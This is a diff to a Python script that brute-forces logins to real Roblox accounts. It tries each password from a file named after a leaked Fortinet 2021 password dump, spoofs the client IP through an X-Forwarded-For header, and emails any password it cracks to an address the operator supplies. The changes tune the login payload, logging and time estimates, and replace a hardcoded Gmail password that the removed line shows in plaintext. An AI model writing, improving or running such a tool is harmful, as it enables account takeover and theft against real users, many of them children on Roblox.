@@ -68,7 +68,7 @@ def send_email(success, username, password, receiver_email):
     try:
         with smtplib.SMTP('smtp.gmail.com', 587) as server:
             server.starttls()
-            server.login(sender_email, 'breacherbot!1')  # Use app password for Gmail
+            server.login(sender_email, os.getenv('EMAIL_PASSWORD'))  # Use app password for Gmail
             text = msg.as_string()
             server.sendmail(sender_email, receiver_email, text)
         print(f"\n[INFO] Email sent to {receiver_email}")
@@ -79,13 +79,16 @@ def read_passwords(file_path):
     try:
         with open(file_path, 'r') as file:
             passwords = file.readlines()
-        return [password.strip() for password in passwords]
+        # Remove empty lines and comments
+        passwords = [pwd.strip() for pwd in passwords if pwd.strip() and not pwd.startswith('#')]
+        return passwords
     except Exception as e:
         print(f"[ERROR] Failed to read password file {file_path}: {e}")
         return []
 
 def attempt_login(username, password, user_agent, ip_address, token=None, cookie=None):
     url = 'https://www.roblox.com/newlogin'
+    
     headers = {
         'User-Agent': user_agent,
         'X-Forwarded-For': ip_address,
@@ -100,13 +103,13 @@ def attempt_login(username, password, user_agent, ip_address, token=None, cookie
         headers['Cookie'] = cookie
 
     data = {
-        'ctype': 'Username',
-        'cvalue': username,
-        'password': password
+        'Username/Email/Phone': username, 
+        'password': password,
     }
 
     try:
         response = requests.post(url, headers=headers, data=data, timeout=10)
+        
         if response.status_code == 200:
             return response
         else:
@@ -131,7 +134,7 @@ def estimate_time_left(total_attempts, passwords, start_time):
         print("No attempts made yet. Estimating time left is not possible.")
         return
 
-    attempts_left = sum(len(read_passwords(f)) for f in passwords) - total_attempts
+    attempts_left = len(passwords) - total_attempts
     elapsed_time = time.time() - start_time
 
     if attempts_left <= 0:
@@ -160,7 +163,7 @@ def main():
     username = input("Enter username or email/phone number: ")
     receiver_email = input("Enter email to receive notifications: ")
 
-    passwords = read_passwords('fortinet-2021_passwords.txt')  # Updated file
+    passwords = read_passwords('fortinet-2021_passwords.txt')  # Change file if needed
     total_attempts = 0
     start_time = time.time()
 
@@ -175,15 +178,15 @@ def main():
         if response and response.status_code == 200:
             print_box("Success!", f"Guessed password: {password}", "Login Successful", response.status_code, response.headers)
             send_email(True, username, password, receiver_email)
+            log_attempt(username, password, success=True)
             break
         else:
-            print_box("Failed", f"Guessed password: {password}", "Login Failed", response.status_code if response else "No response", response.headers if response else "No response")
+            print_box("Failed", f"Guessed password: {password}", "Login Failed", response.status_code, response.headers)
+            log_attempt(username, password, success=False)
         
         total_attempts += 1
-        log_attempt(username, password, success=False)
-
         track_passwords_per_minute(start_time, total_attempts)
-        estimate_time_left(total_attempts, ['fortinet-2021_passwords.txt'], start_time)
+        estimate_time_left(total_attempts, passwords, start_time)
 
 if __name__ == "__main__":
     main()
